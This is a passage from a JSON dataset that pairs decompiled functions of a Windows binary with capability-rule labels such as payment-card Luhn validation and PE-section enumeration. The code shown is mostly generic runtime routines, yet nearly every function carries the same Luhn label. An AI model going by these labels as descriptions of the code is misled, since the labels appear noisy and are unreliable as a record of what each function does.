fcn.004055ce(uVar6, 0x17, dVar7, uVar8, uVar9, arg_8h);\n    }\n    else {\n        if (dVar7 == 0.0) {\n            iVar2 = fcn.00404e3a(noname_0, uVar6);\n            if (iVar2 != 0) {\n                *arg_10h = 0;\n                uVar8 = *0x54fbb0;\n                uVar9 = *0x54fbb0 >> 0x20;\n                dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n                uVar6 = 0;\n                goto code_r0x004925e7;\n            }\n            dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n        }\n        fVar3 = fcn.00403a03(SUB84(dVar7, 0), dVar7 >> 0x20, arg_10h);\n        fcn.004051a0(arg_8h, 0xffff);\n        fVar3 = fVar3;\n    }\n    return fVar3;\n}\n",
        "token_count": 699
    },
    "00405c9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c9a(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.00401de8(arg_8h, arg_ch, 0x7ffffffe);\n        iVar3 = fcn.0040376a(iVar2 + 1);\n        in_ECX[5] = iVar2;\n        in_ECX[4] = arg_8h;\n        fcn.0040576d(iVar3, arg_10h, arg_8h * 2);\n        *(arg_8h * 2 + iVar3) = 0;\n        if (7 < arg_ch) {\n            fcn.00401659(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar3;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 294
    },
    "00405dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405dd0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00405786(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 77
    },
    "00405de4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405de4(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        puVar4 = &arg_10h;\n        do {\n            puVar4 = puVar4 + 1;\n            iVar2 = fcn.00402bb2(arg_8h, arg_ch, *puVar4);\n            if (iVar2 != 0) {\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00405e07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.00405e07(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *in_FS_OFFSET;\n    uchar **ppuStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_1ch;\n    \n    ppuStack32 = &ppuStack32;\n    var_14h = 0x41e310;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    piVar1 = *(*param_1 + *(**param_1 + 4) + 0x38);\n    if (piVar1 != NULL) {\n        var_10h = 0;\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 213
    },
    "00405e1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405e1b(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0x10));\n    fcn.004040d9(*(param_1 + 0x14));\n    fcn.004040d9(*(param_1 + 0x18));\n    return;\n}\n",
        "token_count": 94
    },
    "00405e89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.00405e89(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        arg_8h_00 = fcn.004024c3(arg_8h, &arg_ch, &var_310h);\n        fcn.00405a8d(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.00403085(var_310h);\n    return;\n}\n",
        "token_count": 290
    },
    "00405ea2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ea2(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    \n    puVar2 = fcn.00406181(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    uVar1 = puVar2[1];\n    *arg_8h = *puVar2;\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 137
    },
    "00405ea7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405ea7(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h < 0x3fffffff) && (arg_ch < 0xffffffff / arg_10h)) {\n        if (arg_ch * arg_10h < ~(arg_8h * 4)) {\n            uVar1 = fcn.00404fd9(arg_8h * 4 + arg_ch * arg_10h, 1);\n            fcn.00406302(0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 148
    },
    "00405f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f10(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00491b6a(0, \"FlsAlloc\", 0x54fb04, 0x54fb0c);\n    if (pcVar1 != NULL) {\n        (**0x573000)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00491ce3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    return;\n}\n",
        "token_count": 146
    },
    "00405f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f74(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint var_4h;\n    \n    if (arg_8h < in_ECX[5] || arg_8h == in_ECX[5]) {\n        arg_8h_00 = in_ECX;\n        if (7 < in_ECX[5]) {\n            arg_8h_00 = *in_ECX;\n        }\n        in_ECX[4] = arg_8h;\n        fcn.00404c50(arg_8h_00, arg_ch, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n    }\n    else {\n        fcn.00401e8d(arg_8h, in_ECX, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "00405f97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405f97(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.004060eb(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        cVar2 = fcn.00405d21(unaff_EBX & 0xffffff00 | uVar1);\n        if (cVar2 == '\\0') {\n            *(param_1 + 0x18) = 0xffffffff;\n        }\n        else {\n            *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n        }\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 329
    },
    "00405fc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fc9(uint arg_8h)\n\n{\n    fcn.004a8901(arg_8h, 2, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00405ff1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405ff1(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00402f18(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 229
    },
    "004060f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060f5(int32_t arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    *in_ECX = arg_8h;\n    if (arg_8h == 0) {\n        fcn.00402356();\n    }\n    else if (arg_8h < 8) {\n        fcn.004045f2(arg_8h * 0x18 + 0x56f128);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00406181": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406181(uint *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    for (; arg_ch != arg_10h; arg_ch = arg_ch + 1) {\n        fcn.00401d9d(*arg_ch);\n    }\n    *arg_8h = arg_14h;\n    arg_8h[1] = arg_18h;\n    return;\n}\n",
        "token_count": 112
    },
    "00406190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406190(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403ff3(arg_ch);\n    *arg_8h = iVar1;\n    return (-(iVar1 != 0) & 0xfffffff4) + 0xc;\n}\n",
        "token_count": 81
    },
    "004061c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004061c2(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402ad6();\n    return iVar1 + 0x14;\n}\n",
        "token_count": 45
    },
    "004061db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.004061db(uint32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    \n    uVar2 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar2 != 0) {\n        cVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (cVar1 == '\\0') goto code_r0x00492123;\n        uVar2 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar4 = puVar3;\n            puVar3 = puVar4 + 1;\n        } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);\n        uVar2 = *puVar4;\n        if (uVar2 == '\\0') {\n            return puVar4 - param_1;\n        }\n        if (uVar2 >> 8 == '\\0') {\n            return puVar4 + (1 - param_1);\n        }\n        if ((uVar2 & 0xff0000) == 0) {\n            return puVar4 + (2 - param_1);\n        }\n    } while ((uVar2 & 0xff000000) != 0);\ncode_r0x00492123:\n    return puVar3 + (-1 - param_1);\n}\n",
        "token_count": 338
    },
    "004061fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061fe(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = arg_8h[4];\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    if (uVar1 < 8) {\n        *in_ECX = *arg_8h;\n        in_ECX[1] = arg_8h[1];\n        in_ECX[2] = arg_8h[2];\n        in_ECX[3] = arg_8h[3];\n        uVar3 = 7;\n    }\n    else {\n        uVar3 = 0x7ffffffe;\n        if ((uVar1 | 7) < 0x7fffffff) {\n            uVar3 = uVar1 | 7;\n        }\n        uVar2 = fcn.004043b8(uVar3 + 1);\n        *in_ECX = uVar2;\n        fcn.0040576d(uVar2, arg_8h, uVar1 * 2 + 2);\n    }\n    in_ECX[4] = uVar1;\n    in_ECX[5] = uVar3;\n    return;\n}\n",
        "token_count": 305
    },
    "00406230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406230(uint param_1)\n\n{\n    int32_t lpCriticalSection;\n    \n    LOCK();\n    *0x56ccbc = *0x56ccbc + 1;\n    if (*0x56ccbc == 0) {\n        lpCriticalSection = 0x56f128;\n        do {\n            fcn.00401208(lpCriticalSection);\n            lpCriticalSection = lpCriticalSection + 0x18;\n        } while (lpCriticalSection != 0x56f1e8);\n    }\n    return param_1;\n}\n",
        "token_count": 119
    },
    "0041dba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.0041dba0(code **param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar **ppuStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_1ch;\n    \n    ppuStack32 = &ppuStack32;\n    var_14h = 0x41e500;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    fcn.00405a60(param_1 + 1);\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 183
    },
    "004062df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004062df(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00404593(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 76
    },
    "00406348": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406348(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t arg_1ch;\n    int32_t iVar1;\n    int32_t arg_18h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    arg_1ch = arg_ch - arg_8h >> 1;\n    uVar3 = 0xffffffff;\n    uVar2 = arg_14h - arg_10h >> 1;\n    if (arg_18h == 0) {\n        iVar1 = fcn.0040379c();\n        iVar1 = *(iVar1 + 4);\n    }\n    else {\n        iVar1 = *(arg_18h + 4);\n    }\n    if (iVar1 == 0) {\n        if (uVar2 <= arg_1ch) {\n            fcn.0040576d(arg_8h, arg_10h, uVar2 * 2);\n        }\n    }\n    else {\n        arg_18h_00 = fcn.0040159b(arg_1ch);\n        if (arg_18h_00 != 0) {\n            uVar3 = fcn.004045b1(iVar1, 0x400, arg_10h, uVar2, arg_18h_00, arg_1ch);\n            if (uVar3 == 0) {\n                uVar3 = fcn.004045b1(iVar1, 0x400, arg_10h, uVar2, 0, 0);\n                if (uVar3 == 0) {\n                    uVar3 = 0x7fffffff;\n                }\n            }\n            else {\n                uVar2 = 0;\n                if (uVar3 != 0) {\n                    do {\n                        *(arg_8h + uVar2 * 2) = *(uVar2 + arg_18h_00);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < uVar3);\n                }\n            }\n        }\n        fcn.004040d9(arg_18h_00);\n        uVar2 = uVar3;\n    }\n    return uVar2;\n}\n",
        "token_count": 520
    },
    "00406352": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406352(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0x10));\n    fcn.004040d9(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 74
    },
    "00406357": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406357(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b230a(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "00406366": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406366(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00404bce();\n    if (iVar1 != 0) {\n        uVar2 = fcn.004037e7(&arg_8h, 1, &var_4h);\n        if (uVar2 != 0) {\n            return uVar2 & 0xffff0000 | arg_8h & 0xffff;\n        }\n    }\n    return 0xffff;\n}\n",
        "token_count": 136
    },
    "004063a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004063a7(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403bfc(arg_8h, arg_8h + 0x1c, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 86
    },
    "004063b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004063b6(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    piVar2 = fcn.00402919(&var_8h, 1, 0);\n    iVar3 = *piVar2;\n    *arg_8h = iVar3;\n    iVar1 = piVar2[1];\n    arg_8h[1] = iVar1;\n    if ((iVar1 == '\\0') && (**0x56f458 != '\\0')) {\n        if (**0x56f458 == '@') goto code_r0x0048f818;\n        var_8h = 0x54f380;\n        var_4h = 2;\n        fcn.004039f4(&var_10h);\n        fcn.004050ba(&var_18h, &var_8h);\n        piVar2 = fcn.004052f9(&var_20h, arg_8h);\n        iVar3 = *piVar2;\n        *arg_8h = iVar3;\n        arg_8h[1] = piVar2[1];\n    }\n    if (**0x56f458 != '@') {\n        if (**0x56f458 != '\\0') {\n            arg_8h[1] = 0;\n            *(arg_8h + 1) = 2;\n            *arg_8h = 0;\n            return arg_8h;\n        }\n        if (iVar3 == 0) {\n            fcn.00402e8c(1);\n            return arg_8h;\n        }\n        var_8h = 0x54f380;\n        var_4h = 2;\n        fcn.004017df(1);\n        fcn.004050ba(&var_18h, &var_8h);\n        piVar2 = fcn.004052f9(&var_10h, arg_8h);\n        *arg_8h = *piVar2;\n        arg_8h[1] = piVar2[1];\n        return arg_8h;\n    }\ncode_r0x0048f818:\n    *0x56f458 = *0x56f458 + 1;\n    return arg_8h;\n}\n",
        "token_count": 571
    },
    "0047a258": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047a258(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00404f20(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "004063ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063ca(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004c8177(3, \"FlsAlloc\", 0x55321c, 0x553224);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    }\n    else {\n        (**0x573000)(arg_8h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "004063cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063cf(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - iVar1) {\n        arg_ch = in_ECX[5];\n        iVar3 = fcn.0040355d(iVar1 + arg_8h, arg_ch, 0x7ffffffe);\n        iVar4 = fcn.004043b8(iVar3 + 1);\n        in_ECX[5] = iVar3;\n        in_ECX[4] = iVar1 + arg_8h;\n        if (arg_ch < 8) {\n            fcn.0040576d(iVar4);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n        }\n        else {\n            iVar3 = *in_ECX;\n            fcn.0040576d(iVar4, iVar3, iVar1 * 2);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n            fcn.00401659(iVar3, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar4;\n        return;\n    }\n    fcn.004038aa();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 401
    },
    "00406401": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406401(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x570068);\n    return;\n}\n",
        "token_count": 47
    },
    "00406456": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00406456(uint noname_0, uchar *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    char cVar3;\n    uint32_t uVar4;\n    \n    *arg_ch = 0x25;\n    puVar1 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = arg_ch + 2;\n    }\n    if ((arg_14h & 0x10) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    *puVar1 = 0x2a2e;\n    puVar2 = puVar1 + 1;\n    if (arg_10h != '\\0') {\n        *puVar2 = arg_10h;\n        puVar2 = puVar1 + 3;\n    }\n    uVar4 = arg_14h & 0x3000;\n    if ((arg_14h & 4) == 0) {\n        if (uVar4 != 0x2000) {\n            if (uVar4 == 0x3000) {\n                cVar3 = 'a';\n            }\n            else {\n                cVar3 = (uVar4 != 0x1000) * '\\x02' + 'e';\n            }\n            goto code_r0x0046c3bf;\n        }\n    }\n    else if (uVar4 != 0x2000) {\n        if (uVar4 == 0x3000) {\n            cVar3 = 'A';\n        }\n        else {\n            cVar3 = (uVar4 != 0x1000) * '\\x02' + 'E';\n        }\n        goto code_r0x0046c3bf;\n    }\n    cVar3 = 'f';\ncode_r0x0046c3bf:\n    *puVar2 = cVar3;\n    *(puVar2 + 1) = 0;\n    return arg_ch;\n}\n",
        "token_count": 482
    },
    "004064c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004064c4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.004060eb(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "0047b279": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.0047b279(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00404d4f(in_ECX, &var_ch, 0x54d9ec, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch, arg_20h);\n    fcn.00406041(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 259
    },
    "0047ada8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.0047ada8(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00404d4f(in_ECX, &var_ch, 0x54d9f4, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00406041(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 249
    },
    "0047c09a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.0047c09a(uint arg_8h, ushort *arg_ch, ushort *arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t *in_ECX;\n    \n    if (arg_ch != arg_10h) {\n        do {\n            pcVar1 = *(*in_ECX + 0x10);\n            (**0x573000)(arg_8h, *arg_ch);\n            cVar2 = (*pcVar1)();\n            if (cVar2 != '\\0') {\n                return arg_ch;\n            }\n            arg_ch = arg_ch + 1;\n        } while (arg_ch != arg_10h);\n    }\n    return arg_ch;\n}\n",
        "token_count": 159
    },
    "00406532": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
